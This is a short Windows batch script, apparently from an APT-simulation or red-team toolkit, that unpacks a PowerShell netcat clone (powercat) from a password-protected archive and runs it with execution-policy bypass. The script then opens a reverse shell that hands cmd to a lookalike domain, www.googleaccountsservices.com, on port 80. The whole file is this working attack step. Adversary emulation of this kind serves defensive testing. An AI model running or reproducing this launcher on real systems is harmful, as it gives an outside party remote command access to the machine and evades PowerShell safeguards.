@ECHO OFF

ECHO ===========================================================================
ECHO NETCAT ALTERNATIVE
ECHO.
ECHO Dropping a Powershell netcat alternative into the APT dir
ping -n 5 127.0.0.1 > NUL

"%ZIP%" e -p%PASS% %TOOLARCH% -aoa -o%APTDIR% toolset\nc.ps1 > NUL
powershell -Exec Bypass ". %APTDIR%\nc.ps1;powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd"

